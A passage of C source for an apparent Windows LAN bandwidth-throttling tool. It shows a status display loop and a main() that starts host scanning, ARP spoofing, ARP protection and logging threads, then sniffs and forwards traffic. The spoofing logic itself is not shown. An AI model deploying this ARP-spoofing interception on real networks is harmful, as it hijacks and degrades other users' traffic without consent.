                aliveCount++;
                if(memory_empty(pNode->mac,6))
                {
                    notResHost++;
                }
            }
            n++;
            if(gl_Sys_Con.respondMode==2 && pNode->alive)
            {

            }
        }
        if(print_lock) return 0;
        system("cls");
        printf("%s\n",about_str);
        if(gl_Sys_Con.sceneMode==2 && gl_Sys_Con.respondMode==1)
        {
            notResHost=aliveCount-notResHost;
            notResHost=n-notResHost;
            aliveCount=n;
        }
        printf("\t       本机IP：%s",gl_Sys_Con.myIPAddress);
        printf("\t网关IP：%s\n",gl_Sys_Con.gatewayIp);
        printf("\t-------------------------------------------------------------\n");
        printf("\t|\t子网主机：\t%d\t\t个\t\t    |\n",subHostCount);
        printf("\t|\t限速主机:\t%d\t\t个\t\t    |\n",aliveCount);
        printf("\t|\t无应答主机：\t%d\t\t个\t\t    |\n",notResHost);
        printf("\t|\t探测计数：\t%d\t\t次\t\t    |\n",macScanCount);
        printf("\t|\t应答ARP包:\t%d\t\t个\t\t    |\n",arpPacketCount);
        printf("\t|\t接收流量包:\t%d\t\t个\t\t    |\n",flowPacketCount);
        printf("\t|\t转发流量速率:\t%.2f\t\tKb/s\t\t    |\n",recordFlowSpeed/1024);
        printf("\t|\t总转发流量:\t%.2f\t\tMb\t\t    |\n",totalFlowSize/1024/1024);
        printf("\t-------------------------------------------------------------\n");

        Sleep(1000);
    }

    return 0;
}

int main(int argc,char *argv[])
{
    char devName[265];
    char myIPAddress[16],myMAC[6];
    char gatewayIp[16];
    pcap_t *hpcap=NULL;
    HANDLE hThread = NULL;

    InitializeCriticalSection(&cs_flowSpeed);
    InitializeCriticalSection(&cs_arpCount);
    InitializeCriticalSection(&cs_threadCount);
    srand(time(NULL));

    SMALL_RECT winPon= {0,0,80,30};
    HANDLE con=GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleWindowInfo(con,TRUE,&winPon);
    CONSOLE_CURSOR_INFO cursor_info = {1, 0};
    SetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &cursor_info);

    about();
    if(init_config()!=0)
    {
        printf("配置文件参数错误！请重新生成。\n");
        getch();
        exit(-1);
    }

    system("cls");
    if(ChooseDev(devName,sizeof(devName),myIPAddress)!=TRUE)
    {
        printf("获取网卡失败。\n");
        getch();
        return -1;
    }
    //获取本机网卡信息
    if(GetAdapterInfo(myIPAddress,myMAC,gatewayIp)!=TRUE)
    {
        printf("获取网卡信息失败。\n");
        getch();
        return -1;
    }
    //打开网卡
    if((hpcap=OpenAdapter(devName))==NULL)
    {
        printf("网卡打开出错。\n");
        getch();
        return -1;
    }

    strcat(gl_Sys_Con.gatewayIp,gatewayIp);
    strcat(gl_Sys_Con.myIPAddress,myIPAddress);
    memcpy(gl_Sys_Con.myMAC,myMAC,6);
    gl_Sys_Con.hpcap=hpcap;

    if(init_host_list()!=0)
    {
        printf("初始化主机列表失败！\n");
        getch();
        return -1;
    }

    //开启扫描MAC线程
    hThread = CreateThread(NULL,0,scan_host_mac_thread,NULL,0,NULL);
    if(hThread == NULL)
    {
        puts("Create scan_host_mac_thread failed.");
        getch();
        exit(-1);
    }

    if(gl_Sys_Con.respondMode==1)
    {
        //开启ARP欺骗线程
        hThread = CreateThread(NULL,0,arp_spoof_thread,NULL,0,NULL);
        if(hThread == NULL)
        {
            puts("Create arp_spoof_thread failed.");
            getch();
            exit(-1);
        }
    }

    //开启本机ARP防护线程
    hThread = CreateThread(NULL, 0, arp_protect_thread, NULL, 0, NULL);
    if(hThread == NULL)
    {
        puts("Create arp_protect_thread failed.");
        getch();
        exit(-1);
    }

    //开启流量清零线程
    hThread = CreateThread(NULL,0,flow_clear_thread,NULL,0,NULL);
    if(hThread == NULL)
    {
        puts("Create flow_clear_thread failed.");
        getch();
        exit(-1);
    }

    //开启日志线程
    hThread = CreateThread(NULL,0,print_log_thread,NULL,0,NULL);
    if(hThread == NULL)
    {
        puts("Create print_log_thread failed.");
        getch();
        exit(-1);
    }

    //进入嗅探转发
    sniffer();

    return 0;
}
